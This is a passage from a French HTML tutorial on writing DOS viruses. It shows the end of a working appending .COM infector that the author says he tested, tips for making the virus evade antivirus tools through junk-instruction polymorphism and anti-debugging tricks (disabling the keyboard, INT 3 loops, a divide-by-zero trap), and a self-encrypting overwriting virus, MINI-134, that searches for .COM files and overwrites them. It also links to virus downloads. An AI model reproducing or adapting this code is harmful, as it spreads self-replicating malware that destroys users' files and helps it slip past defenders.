+<font color="#a6caf0">; Met l'attribut du fichier en Normal , de cette manière on peut écrire :)</font>
+
+                  mov ax,4301h                  ;<font color="#a6caf0"> Demande au DOS de changer les attribus</font>
+                  xor cx,cx                     <font color="#a6caf0">; Aucun attribu (XOR CX,CX = MOV CX,0)</font>
+                  lea dx,[bp+NEW_DTA+30]        <font color="#a6caf0">; Pointe vers le nom du fichier en DTA</font>
+                  int 21h                       <font color="#a6caf0">; Appel le DOS pour pointer</font>
+
+<font color="#a6caf0">; Calculate jump offset for header of victim so it will run virus first.</font>
+
+                  mov ax,word ptr [bp+NEW_DTA+26] <font color="#a6caf0">; Met la taille du fichier en AX</font>
+                  sub ax,3                        <font color="#a6caf0">; Soustraire 3 à AX</font>
+                  mov word ptr [bp+JMP_OFFSET],ax <font color="#a6caf0">; Store new offset</font>
+
+<font color="#a6caf0">; Close the file and reopen it for read/write. BX still holds file handle.</font>
+
+                  mov ah,3eh                    <font color="#a6caf0">; Demande au DOS de fermer le fichier</font>
+                  int 21h                       <font color="#a6caf0">; Ferme le fichier</font>
+                  mov ax,3d02h                  <font color="#a6caf0">; Demande ouvrir le fichier Lecture/Ecriture</font>
+                  int 21h                       <font color="#a6caf0">; Le DOS ouvre le fichier</font>
+                  xchg ax,bx                    <font color="#a6caf0">; Put file handle in BX</font>
+
+<font color="#a6caf0">; Write the new header at the beginning of the file. (Nouvel entête de 3 bytes)</font>
+
+                  mov ah,40h                    <font color="#a6caf0">; Demande au dos d'ecrire dans le fichier</font>
+                  mov cx,3                      <font color="#a6caf0">; Ecrit trois bytes</font>
+                  lea dx,[bp+HEADER]            <font color="#a6caf0">; Pointe vers les 3 bytes à écrire</font>
+                  int 21h                       <font color="#a6caf0">; Ecrit</font>
+
+<font color="#a6caf0">; Move to end of file so I can append the virus to it.</font>
+
+                  mov al,2                      <font color="#a6caf0">; Select end of file</font>
+                  call FILE_PTR                 <font color="#a6caf0">; Va à la fin du fichier</font>
+
+<font color="#a6caf0">; Append the virus to the end of the file. (virus placé à la FIN du fichier)</font>
+
+                  mov ah,40h                    <font color="#a6caf0">; Fonction ouvrir le fichier</font>
+                  mov cx,END_VIRUS-START_VIRUS  <font color="#a6caf0">; Met le taille du virus en CX </font>
+                  lea dx,[bp+START_VIRUS]       <font color="#a6caf0">; Démarre du début du virus</font>
+                  int 21h                       <font color="#a6caf0">; Ouvre
+
+<a name="garde_heure">; Restore the file's original timestamp and datestamp.  These values were</a>
+; stored in the DTA by the Findfirst / Findnext services.</font>
+
+                  mov ax,5701h                  <font color="#a6caf0">; Fonction Date et heure</font>
+                  mov cx,word ptr [bp+NEW_DTA+22] <font color="#a6caf0">; restaure l'heure</font>
+                  mov dx,word ptr [bp+NEW_DTA+24] <font color="#a6caf0">; Restaure la date</font>
+                  int 21h                       <font color="#a6caf0">; Execution !
+
+; Restore original file attributes.</font>
+
+                  mov ax,4301h                  <font color="#a6caf0">; Fonction changer les attributs</font>
+                  mov cx,word ptr [bp+NEW_DTA+21] <font color="#a6caf0">; Prend les attributs d'origine du fichier</font>
+                  lea dx,[bp+NEW_DTA+30]        <font color="#a6caf0">; Pointe vers le nom du fichier</font>
+                  int 21h                       <font color="#a6caf0">; Appel le DOS
+
+; Lastly, close the file and go back to main program.</font>
+
+                  mov ah,3eh                    <font color="#a6caf0">; DOS Ferme fichier</font>
+                  int 21h                       <font color="#a6caf0">; Ferme</font>
+                  jmp QUIT                      <font color="#a6caf0">; Ok , c'est fini.</font>
+
+<font color="#c0dcc0">;*** Subroutine SET_DTA ***</font>
+
+SET_DTA           proc near
+                  mov ah,1ah                    <font color="#a6caf0">; DOS change la DTA</font>
+                  int 21h                       <font color="#a6caf0">; Changer</font>
+                  retn                          <font color="#a6caf0">; Retourner</font>
+SET_DTA           endp
+
+
+<font color="#c0dcc0">;*** Subroutine FILE_PTR ***</font>
+
+
+FILE_PTR          proc near
+                  mov ah,42h                    <font color="#a6caf0">; DOS change le pointeur pour Lecture/Ecriture</font>
+                  xor cx,cx                     <font color="#a6caf0">; Offset = 0</font> 
+                  cwd                           <font color="#a6caf0">; xor dx,dx  ==&gt; DX=0</font>
+                  int 21h                       <font color="#a6caf0">; Appel le DOS</font>
+                  retn                          <font color="#a6caf0">; Retourner d'où on m'a appelé</font>
+FILE_PTR          endp
+
+
+
+<font color="#a6caf0">; This area will hold all variables to be encrypted</font>
+
+COM_MASK          db '*.com',0                  <font color="#a6caf0">; On cherche les fichier avec l'extention .COM</font>
+
+ORIG_START        db 0cdh,20h,0                 <font color="#a6caf0">; Entête du fichier infecté
+                                                ; Les 3 fameux Bytes.</font>
+HEADER            db 0e9h                       <font color="#a6caf0">; commande de saut pour le nouvel entête</font>
+
+START_VIRUS       endp
+
+END_VIRUS         equ $                         <font color="#a6caf0">; Marque la fin du fichier</font>
+				  	        <font color="#a6caf0">; (pour calculer sa taille)</font>
+<font color="#008000"><b><u>; This data area is a scratch area and is not included in virus code.</u></b></font>
+
+JMP_OFFSET        dw ?                          <font color="#a6caf0">; Saut pour le nouvel header</font>
+NEW_DTA           db 43 dup(?)                  <font color="#a6caf0">; Nouvelle localisation de la DTA</font>
+end MAIN</font>
+</b></font></pre>
+<font color="#ffffff" size="3"><b>Le code assembleur : <a href="http://membres.lycos.fr/gatesbillou/virus/download/203.zip"><font color="#fca443">203.asm</font></a><br>
+<br>
+Annimation du fonctionnement d'un virus sans recouvrement :<br>
+<br><i>Source : http://iquebec.ifrance.com/projinfo/virus2.html</i><br>
+<img src="virus_com_data/srecou.gif" border="0" height="300" width="500">
+<br>
+Un peu plus long que l'autre , hein ??<br>
+Ce petit virus , je l'ai trouvé sur internet il y quelque temps déjà.<br>
+Il fonctionne très bien , je l'ai essayé :) <br>
+Comme vous voyez , il n'est pas très furtif , mais c'est déjà un bon petit virus.<br>
+Le problème qui se pose si vous voulez reprendre ce virus pour
+l'améliorer ou y ajouter deux ou trois petites fantaisies c'est qu'il
+est répertorié par les anti-virus , et donc détectable.<br>
+Ce que je vous propose est tiré du système de polymorphisme des virus ,
+et peut vous aider à rendre ce virus indétectable ,ou plutôt , a créer
+une variante inconnue par les logiciels d'antivirus.<br>
+Le méthode est très simple.<br>
+Vous prenez le code précédent en lui ajoutant des opérations inutiles ou des opérations qui s'annulent.<br>
+</b></font><pre><font color="#ffffff" size="3"><b><b><u>Exemple en reprenant le code précédent :</u></b>
+
+<a href="#FIND_OFFSET"><font color="#fffbf0">FIND_OFFSET:</font></a> 
+                  pop bp                   ; BP holds current IP
+
+<font color="#ffff00">Puis on insert des trucs inutiles :</font>
+
+        <font color="#c0c0c0"> inc si	      ; Incrémenter SI (si=si+1)
+         push ax      ; Empile AX
+         nop          ; Totalement Inutile =&gt; No OPerand
+         dec si       ; Décrémente SI (si=si-1)
+         mov al,206   ; al=11001110b
+         mov ah,4     ; ah=00000100b
+                      ; ici ax=1234   (AH est la partie haute de AX et AL est sa partie basse)   
+         sub ax,1234  : Décrémente ax de 1234 (ax=0 maintenant)
+         pushf        ; Empile le flag
+         nop          ; Toujours inutile (ne rien faire)
+         popf         ; Dépiler le flag
+         pop ax       ; Dépile AX</font>
+		 
+<font color="#ffff00">Jusqu'ici !</font>
+
+A ce stade le programme a été modifié mais ça ne change absolument rien à son fonctionnement.<br>
+
+                  sub bp, offset FIND_OFFSET    ; Calculate net change
+                                                ; Change BP to start of
+                                                ; virus code
+
+; Restore original bytes to the infected program.
+
+<font color="#ffff00">On va ajouter des <font color="#c0c0c0">NOP</font> par alternances.</font>
+
+                  lea si,[bp+ORIG_START]        ; Restore original 3 bytes
+	      <font color="#c0c0c0"> nop ; Non OPerand </font>
+                  mov di,100h                   ; to 100h, start of file
+	    <font color="#c0c0c0">   nop ; Non OPerand </font>
+                  push di                       ; Copy 3 bytes
+	      <font color="#c0c0c0"> nop ; Non OPerand </font>
+                  movsw
+	     <font color="#c0c0c0">  nop ; On ajoute un dernir NOP pour le fun</font>
+                  movsb
+</b></font></pre>
+<font color="#ffffff" size="3"><b>Bien entendu , les antivirus évolués
+ne vont pas tomber dans le piège ,ils vont ignorer les NOP et les
+instructions qui s'annulent pour pouvoir y voir plus clair , mais ça
+suffit pour dérouter beaucoup d'antivirus et , par la même occasion,
+pour vous montrer le principe de base du <a href="#polymorphe"><font color="#fffbf0">polymorphisme</font></a>.<br>
+<br>
+Il serait aussi intéressant d'ajouter à votre virus une 'protection'
+qui rendrait un peu plus difficile la tâche des développeurs
+d'antivirus.<br>
+Un exemple de protection consiste à brouiller votre code pour qu'il soit difficile à conprendre.<br>
+IL faut savoir qu'un code désassemblé ne contient plus les commentaires
+, donc le concepteur s'y retrouve facilement mais lorsqu'une personne
+extérieure tente d'annalyser votre code, il risque d'y passer du temps
+, beaucoup de temps ...<br>
+Une autre astuce est de s'attaquer au désassembleur lui même.<br>
+En effet , si on arrive à empêcher un désassembleur à analyser votre
+code automatiquement il faudra alors que la personne trace votre
+programme pas à pas et enlève (ou désactive) votre protection
+manuellement et tout ça demande aussi du temps :)<br>
+Voici quelques méthodes qui datent un peu mais fonctionnent encore:<br>
+</b></font><pre><font color="#ffffff" size="3"><b><a name="anti_debug"> <font color="#ff00ff">* Désactivation des interruptions via le controleur 8259.</font></a>
+
+ <font color="#00ffff">IN     AL,21	<font color="#a6caf0">; Lecture du port 21 en AL</font>
+ OR     AL,02	<font color="#a6caf0">; ou AL,02</font>
+ OUT    21,AL	<font color="#a6caf0">; Ecrit al sur port 21</font></font>
+
+<font color="#ff00ff"> * Désactivation du clavier.</font>
+(A utiliser avant d'autres astuce anti debugging)
+
+  <font color="#00ffff">
+  MOV    al,02
+  OUT    21h,AL	<font color="#a6caf0">; Désactive le clavier</font></font>
+  
+<font color="#ff00ff"> * Réactive le clavier.
+ 
+ <font color="#00ffff">
+  MOV    al,00
+  OUT    21h,al <font color="#a6caf0">; Réactive le clavier (faudra bien)</font> 
+
+ <font color="#ff00ff">* Vérifier si le programme est ralenti par un débugger en arrière-plan.</font>
+
+ <font color="#00ffff">SUB    AX,AX
+ STI			
+ MOV    DS,AX
+ MOV    AH,[046C]               <font color="#a6caf0">; Timer système. On récupère l'heure actuelle.</font>
+ retour:
+ MOV    AL,[046C]               <font color="#a6caf0">; Encore une fois</font>
+ CMP    AL,AH                   <font color="#a6caf0">; Même heure ?</font>
+ JZ     retour                  <font color="#a6caf0">; (si un debugger analyse votre code il tourne en rond)</font>
+</font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Le
+debugger ralentit le code. En comparant le timer très rapidement il ne
+doit pas y avoir de différence , sinon c'est qu'on analyse le code .<br>
+Dans ce cas , on peut très bien grâce aux boitiers ATX arrêter l'ordinateur :o) <br>
+Voici un exemple non commenté pour couper l'alimentation : <a href="http://membres.lycos.fr/gatesbillou/virus/download/atxoff.zip">ATXOFF</a><br>
+</font><br>
+</font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffff00"><b><u>Ou tout simplement ceci:</u></b></font>
+
+<font color="#00ffff"> MOV CX,100  <font color="#a6caf0">; C'est parti pour 100 boucles ...</font>
+stop: 
+ INT 3       <font color="#a6caf0">; arrête le debugger ici</font>
+ LOOP STOP   <font color="#a6caf0">; Continu la boucle</font></font>
+</font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"> <font color="#ffffff"><br>
+Ca , c'est pratique si le gars est débutant et qu'il ne sait pas utiliser un debugger.<br>
+Lorsqu'il va tracer le programme pas à pas son debugger va s'arrêter à chaque boucle (et il y en à 100).<br>
+Il risque donc d'y passer une petite heure sur cette boucle qui ne sert à rien.<br>
+Bien sûr, ceci fera rigoler le développeur d'antivirus ou le gars qui s'y connait un minimum.<br>
+Mais si déja on commence par combiner deux méthodes entre elle :<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#00ffff">Anti_debugger:
+  MOV CX,100
+Clavier_off: <font color="#a6caf0">; 100 boucles !</font> 
+  MOV al,02
+  OUT 21h,al <font color="#a6caf0">; Désactive le clavier</font>
+  INT 3      <font color="#a6caf0">; Stop le debugger</font>
+ LOOP Clavier_off
+  MOV al,00  
+  OUT 21h,al <font color="#a6caf0">; Réactive le clavier</font>
+  </font>
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Ici , on désactive le clavier et on arrête le débugger.<br>
+C'est déja un peu plus enbêtant :o)<br>
+Le gars se retrouve sous son debugger mais son clavier ne marche plus ...<br>
+Nous pouvons aussi utiliser l'opcode 0F1h , qui d'après 'Black Jack'
+serait un opcode non documenté (sur les processeur Intel) qui
+remplacerait l'interruption 01h (Pas à Pas).
+<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#ff00ff"> * The DIV Trap (Division par 0).</font>
+
+<font color="#00ffff">Start:
+ mov     ax, offset Continue</font> <font color="#a6caf0">; AX = offset de 'Continue'</font>
+ <font color="#00ffff">mov     dx, cs</font>              <font color="#a6caf0">; Copie Code Segment dans DX</font>
+ <font color="#00ffff">xor     bx, bx</font>              <font color="#a6caf0">; BX = 0</font>
+ <font color="#00ffff">mov     cx, bx</font>              <font color="#a6caf0">;</font> 
+ <font color="#00ffff">mov     es, bx</font>              <font color="#a6caf0">; Pointe ES sur BX (0)</font>
+ <font color="#00ffff">cli</font>                         <font color="#a6caf0">; CLI (Clear Interrupt) i=0</font>
+ <font color="#00ffff">xchg    ax, es:[bx]</font>         <font color="#a6caf0">; Echange AX avec l'octet pointé ES:[BX]</font>
+ <font color="#00ffff">xchg    dx, es:2[bx]</font>        <font color="#a6caf0">; Echange DX avec l'octet pointé ES:[BX+2]</font>
+ <font color="#00ffff">sti</font>                         <font color="#a6caf0">; Restaure l'interruption i=1</font>
+
+ <font color="#00ffff">div     cx</font>                  <font color="#a6caf0">; ICI , si on est sous un debugger (TD) on plante (division par 0)</font>
+<font color="#00ffff">Continue:
+ cli</font>
+ <font color="#00ffff">xchg    ax, es:[bx]</font>
+ <font color="#00ffff">xchg    dx, es:2[bx]</font>
+ <font color="#00ffff">sti</font>
+<font color="#c0dcc0"><i>Suite du programme ...</i></font>
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><a name="trap_01">Un autre petit exemple montre comment 'cacher' une clef.<br></a>
+(Cet exemple fonctionne pour les désassembleurs , pas pour les débuggers).<br>
+<br></font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><a name="trap_opcode"></a><a name="cache_clef"><font color="#ff00ff">* Saut au milieu d'une instruction.</font></a>
+
+ <font color="#00ffff"><font color="#00ff00">mov ax</font>,0</font><font color="#ffff00">FE05</font><font color="#00ffff">h</font>    <font color="#a6caf0">; AX =</font> <font color="#ffff00">FE05</font><font color="#a6caf0">h (05FEh = ADD AX !)</font>
+ <font color="#00ffff">jmp $-2</font>          <font color="#a6caf0">; AX = EA03h (saut en arrière vers ADD AX)</font>
+ <font color="#00ffff">add ah,03Bh</font>      <font color="#a6caf0">; AX = 2503h ! (mentionné nulle part !  =&gt; notre clef secrète) </font>
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#baa9d6"><u>Explication :</u></font><br>
+<br></font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">cs:0100 <font color="#00ff00">B8</font><font color="#ffff00">05FE</font>        mov ax,FE05
+cs:0103 <font color="#fcca03">EB</font><font color="#ff8080">FC</font>          jmp 0101
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"> On charge AX avec le valeur <font color="#ffff00">FE05</font>.<br>
+ L'assembleur traduit 'mov ax,0<font color="#ffff00">FE05</font>h' en langage machine par '<font color="#00ff00">B8</font> <font color="#ffff00">05 FE</font>'.<br>
+MAIS , si on saute au milieu d'une instruction , alors la donnée
+chargée en AX est considéréé comme une instruction à exécuter , et non
+plus comme un nombre.<br>
+ Alors au lieu de refaire 'mov ax,0FE05h'  on fait '<font color="#ffff00">add ax</font>,<font color="#fcca03">EB</font><font color="#ffff00">FE</font>h puis <font color="#ff8080">CLD</font>'.<br>
+ (Ceci peut aussi être utilisé pour cacher des appels à certaines fonctions DOS).<br>
+<br></font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><a name="cache_clef"><font color="#ff00ff">* Gestion de la pile.</font></a>
+
+ <font color="#00ffff">PUSH    AX</font>              <font color="#a6caf0">; On met AX dans la pile</font>
+ <font color="#00ffff">POP     AX</font>              <font color="#a6caf0">; On sort AX de la pile</font>
+ <font color="#00ffff">DEC     SP</font>              <font color="#a6caf0">; Décrémente le pointeur SP (Stack Pointeur)</font>
+ <font color="#00ffff">DEC     SP</font>              <font color="#a6caf0">;               "   "</font>
+ <font color="#00ffff">POP     BX</font>              <font color="#a6caf0">; Ici , BX doit pointer vers AX dans la pile.</font>
+ <font color="#00ffff">CMP     AX,BX</font>           <font color="#a6caf0">; Exact ? (AX = BX  ?)</font>
+ <font color="#00ffff">JNE     CODE_IS_TRACED</font>  <font color="#a6caf0">; Non , on doit réagire , on est tracé :o(</font>
+
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Explication : Quand vous tracez le code avec l'int 1 , les 6 octets au dessous de SP sont écrasés avec IP , CS et le Flag .<br>
+On met (push) une valeur dans la pile , on la retire , on ajuste SP et on la retire à nouveau pour voir si ca a changé.<br>
+Si la valeur est changée , c'est qu'on trace le programme.<br>
+<br>
+Bon , il existe d'autres pièges bien plus efficaces , comme le
+remplacement de l'interruption de débogage (int 3), le passage en mode
+protégé , le fameux coup de la PIQ (Prefetch Queue) c'est là que les
+instructions qui vont être exécutées sont mises en attente , le
+cryptage du code etc .<br>
+Tout ceci ne constitue que quelques lignes de code mais ajoute du piment à votre virus.<br>
+<br>
+<font color="#ff00ff"> * Le piège a con (En faisant des essais j'ai découvert un piège vraiment stupide).</font><br>
+<br>
+Rappelez vous de ce que nous avons dis au debut , en ce qui concerne <a href="#registres"><font color="#a6caf0">l'initialisation des registres</font></a> par le DOS lorsqu'il charge un fichier ".COM".<br>
+<br>
+Le truc , c'est que BP n'est pas initialisé à 0 mais prend une valeur qui dépend du système d'exploitation et de sa version.<br>
+Vous avez certainement remarqué que Turbo Debugger initialise cette valeur à 0 !<br>
+Voici donc le code à placer au début de votre programme:<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"> CMP BP,0      ; Bp initialisé à 0 (en gros -&gt; on nous debuge ?)
+ JNE CONTINUE  ; Non , tout va bien , on continue.
+ JMP $         ; Oui ! on nous trace ; on plante immediatement !
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Pièges interressants : <a href="http://membres.lycos.fr/gatesbillou/virus/ADEBGTUT.TXT"><font color="#c997ea">TRAP TO DEBUGGER</font></a> ou ce site : <a href="http://vx.netlux.org/lib/vbj01.html"><font color="#c997ea">http://vx.netlux.org/lib/vbj01.html</font></a><br>
+<br>
+<font color="#ff0000"><u>Cryptage du programme :</u></font><br>
+<br>
+Et si on brouillait un peu le code ... qu'en pensez vous ???<br>
+<br>
+Usft cjfo , heuuuu ... pardon ! , je reste en clair 8-)<br>
+<br>
+Très bien , en général ,un désassembleur prend votre code sur disque et le désassemble , ok?.<br>
+Mais si votre code est crypté ? (à l'exception de la routine de décryptage , bien sûr).<br>
+Lorsque votre programme sera désassemblé , vous vous retrouvez avec
+quatre ou cinq lignes cohérentes , et le reste ce sera du charabia.<br>
+Pour peu que votre programme ait une <a href="#anti_debug"><font color="#c0dcc0">astuce anti debugging</font></a> avant la routine de décryptage , ou une <a href="#cache_clef"><font color="#c0dcc0">manipulation de la clef</font></a> comme vue précédement ... là ca commence à être interressant :o)<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><a name="decrypt">Un décr</a>ypteur très simple et très petit ça ressemble à ça :
+
+<font color="#00ffff">               MOV      SI,offset données_cryptées <font color="#a6caf0">;Pointe vers les données cryptées</font>
+               MOV      CX,10               <font color="#a6caf0">;Compteur de boucle à 10 octets (for cx=1 to 10)</font>
+                                            <font color="#a6caf0">;On rentre dans la boucle pour 10 tours ...</font>
+main_loop:     XOR      BYTE PTR [SI],55    <font color="#a6caf0">;XOR (décrypte avec la clée 55)</font>
+               INC      SI                  <font color="#a6caf0">;incrémente le compteur (prochain octets)</font>
+               LOOP     main_loop           <font color="#a6caf0">;retourne à main_loop (goto main_loop)</font>
+</font></font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Vous voyez , c'est extrêmement simple .<br>
+La fonction XOR est 'bidirectionnelle' , c'est à dire que la fonction sert au chiffrement et au déchiffrement.<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><a name="XOR"><u><font color="#ffff00"><b>Fonction XOR (ou exclusif)</b></font></u></a>
+
+ <font color="#ff0000">A</font> XOR <font color="#00ff00">B</font> = <font color="#ff00ff">C</font>  &lt;==&gt;  <font color="#ff00ff">C</font> XOR <font color="#00ff00">B</font> = <font color="#ff0000">A</font>)       
+ <font color="#ff0000">0</font>     <font color="#00ff00">0</font>   <font color="#ff00ff">0</font>     
+ <font color="#ff0000">0</font>     <font color="#00ff00">1</font>   <font color="#ff00ff">1</font>    <font color="#ff0000">A : Caractère d'origine</font>
+ <font color="#ff0000">1</font>     <font color="#00ff00">0</font>   <font color="#ff00ff">1</font>    <font color="#00ff00">B : Clef de cryptage</font>
+ <font color="#ff0000">1</font>     <font color="#00ff00">1</font>   <font color="#ff00ff">0</font>    <font color="#ff00ff">C : Caractère crypté</font>
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">On pourrait même envisager de changer la clé à chaque octet , ou tout les n octets.<br>
+Une fonction intéressante , et aussi simple ,c'est <font color="#8000ff">SHL</font> et <font color="#0080c0">SHR</font> , qui permettent de décaler les bits. (<font color="#8000ff">Sh</font>ift <font color="#8000ff">L</font>eft &amp; <font color="#0080c0">Sh</font>ift <font color="#0080c0">R</font>ight)<br>
+Attention ! Le décalage de bits n'est pas bidirectionnelle , au contraire de xor.<br>
+<br>
+La protection contre de 'debugging' permet aussi de stopper , ou tout du moins , de rendre difficile l'analyse heuristique.<br>
+<br>
+NB: Lors d'une annalyse heuristique , l'anti-virus crée une machine
+virtuelle dans laquelle il exécute le programme afin de voir si
+celui-ci se comporte 'normalement' ou donne des signes viraux.<br>
+Il est donc intêressant d'empêcher cette analyse.<br>
+<br>
+Mais voyons , et TESTONS , un virus crypté :o)<br>
+Vous le connaissez déja , c'est mini-44 auquel j'ai ajouté la capacité de s'auto-crypter.<br>
+Je n'ai pas mis de piège anti-debugger pour que vous puissiez le tracer avec <a href="http://membres.lycos.fr/gatesbillou/virus/download/TD.ZIP"><font color="#00ff00">Turbo Debugger</font></a>.<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#ffff00"><b><u>Virus crypté :</u></b></font>
+
+<font color="#ff0000">Nom de code : <font color="#00ffff">MINI-134 <i>Evolution</i></font></font>
+ <font color="#00ffff">
+.model small  <font color="#a6caf0">; Définit le modèle de mémoire.</font>
+.code         <font color="#a6caf0">; Début du code.</font>
+
+FNAME EQU 9EH <font color="#a6caf0">; Nom du fichier résultant de la fonction de recherche.</font>
+
+
+org 100h      <font color="#a6caf0">; Offset de chargement (emplacement mêmoire).</font>
+
+start:        <font color="#a6caf0">; Ici on place un point appelé 'start'.(=&gt; label start)</font>
+ mov cx,[ender - debut]  ;<font color="#ff00ff"> Taille du code crypté.</font>
+ mov si,offset  debut    ;<font color="#ff00ff"> SI pointe vers 'debut:'</font>
+ mov ah,byte ptr [si]    ;<font color="#ff00ff"> AH contient le byte pointé par SI (le NOP , just après DEBUT)</font>
+ xor ah,90h              ;<font color="#ff00ff"> <u>Récupère la clef en AH</u></font>
+ decrypt:
+   xor byte ptr [si],ah  ;<font color="#ff00ff"> <u>ici on décrypte avec la clef.</u></font>
+   inc si                ;<font color="#ff00ff"> Déplace le pointeur.</font>
+loop decrypt
+
+<i>; Quand tout est décrypté&#8218; on est ici.
+; Avant d'être décrypté , seul les lignes précédentes étaient compréhensibles.
+</i>
+debut:
+  nop                        ;<font color="#ff00ff"> 90h en code machine. Sert de réference pour décrypter.</font>
+  mov ah,<a href="#4ah"><font color="#05fad6">4ah</font></a>                 <font color="#a6caf0">; Réajustement de la taille d'un bloc de mémoire</font>
+  mov bx,[ender-start]       <font color="#a6caf0">; taille.</font>
+  int 21h
+  mov ah,<a href="#48h"><font color="#05fad6">48h</font></a>                 <font color="#a6caf0">; Allocation de mêmoire</font>
+  int 21h                    <font color="#a6caf0">; Le Carry est à 1 si erreur (ici pas utilisé).</font>
+  mov byte [ds:6ch],ax       <font color="#a6caf0">; Met l'adresse du segment allou&#8218; dans le PSP ,</font>
+                             <font color="#a6caf0">; dans le File Control Block 2 (why not ?)</font>
+  mov es,ax                  <font color="#a6caf0">; Pointe ES vers le segment alloué</font>
+  mov cx,bx                  <font color="#a6caf0">; Initialise le compteur.</font>
+  xor si,si                  <font color="#a6caf0">; Pointeur initialisé à 0.</font>
+  copie:
+   mov bl,byte ptr [start+si]
+   cmp si,offset debut-100h  <font color="#a6caf0"><u>; On est sur la clef ? (-100h car PSP en memoire)</u></font>
+   je crypt                  <font color="#a6caf0"><u>; Oui , on est sur la clef, on va <a href="#crypter"><font color="#00ffff"><u>crypter</u></font></a> ...</u></font>
+   mov byte ptr es:[si],bl   <font color="#a6caf0">; Non , on copie simplement.</font>
+   inc si                    <font color="#a6caf0">; Déplace le pointeur.</font>
+  loop copie
+<a name="sortir_srypt">  sorti</a>e_crypt:
+
+  mov ah,<a href="#4fh"><font color="#05fad6">4fh</font></a>                 <font color="#a6caf0">; Appel de la fonction 4Fh('search next')</font>
+                             <font color="#a6caf0">; qui permet de continuer la recherche des</font>
+                             <font color="#a6caf0">; fichiers .COM dans le répertoire courant.</font>
+  int 21h
+
+
+  mov ah,<a href="#4eh"><font color="#05fad6">4eh</font></a>                 <font color="#a6caf0">; Place la valeur 4Eh dans le registre AH</font>
+                             <font color="#a6caf0">; (c'est la fonction de l'interruption 21h</font>
+                             <font color="#a6caf0">; du DOS qui permet de chercher un fichier).</font>
+                             <font color="#a6caf0">; Pour 4eh , le 'h' correspond à Hexadécimal.</font>
+  mov dx,offset COM_FILE     <font color="#a6caf0">; Place dans DX la chaîne ASCII '*.com' définie</font>
+                             <font color="#a6caf0">; plus bas qui permettra au DOS de chercher</font>
+                             <font color="#a6caf0">; les fichiers .COM grâce à la fonction 4Eh.</font>
+Int 21h                      <font color="#a6caf0">; Execute la recherche et formate un bloc de</font>
+                             <font color="#a6caf0">; 43 octets dans la DTA(Data Transfert Area)</font>
+                             <font color="#a6caf0">; pour y placer le nom du fichier trouvé, sa</font>
+                             <font color="#a6caf0">; position(pour savoir où continuer la recherche</font>
+                             <font color="#a6caf0">; grâce à la fonction 'search next': 4Fh), ses</font>
+                             <font color="#a6caf0">; attributs, la date et l'heure de sa dernière</font>
+                             <font color="#a6caf0">; modification, et sa taille.</font>
+
+				
+search_lp:
+  jc done                    <font color="#a6caf0">; Si aucun fichier n'est trouvé, aller au</font>
+                             <font color="#a6caf0">; label 'done'.</font>
+
+  mov ax,<a href="#3dh"><font color="#05fad6">3d01h</font></a>               <font color="#a6caf0">; Indique au DOS qu'on veut ouvrir le fichier qu'on a trouvé.</font>
+  mov dx,fname               <font color="#a6caf0">; Pointeur vers le nom de fichier trouvé par</font>
+                             <font color="#a6caf0">; la fonction de recherche 'search first'.</font>
+  int 21h                    <font color="#a6caf0">; Lance l'interruption 21h.</font>
+
+  xchg ax,bx                 <font color="#a6caf0">; Déplace de AX vers BX le numéro que le DOS</font>
+                             <font color="#a6caf0">; a attribué à ce fichier pour l'identifier</font>
+                             <font color="#a6caf0">; (le FILE HANDLE).</font>
+
+  mov ah,<a href="#40h"><font color="#05fad6">40h</font></a>                 <font color="#a6caf0">; Place la valeur 40h dans le registre AH</font>
+                             <font color="#a6caf0">; (40h = Fonction du DOS qui permet d'écrire</font>
+                             <font color="#a6caf0">; dans un fichier).</font>
+
+  mov cx,[ender-start]       <font color="#a6caf0">; Réécrit le virus(compris entre le label</font>
+                             <font color="#a6caf0">; 'ender' et le label 'start') par dessus</font>
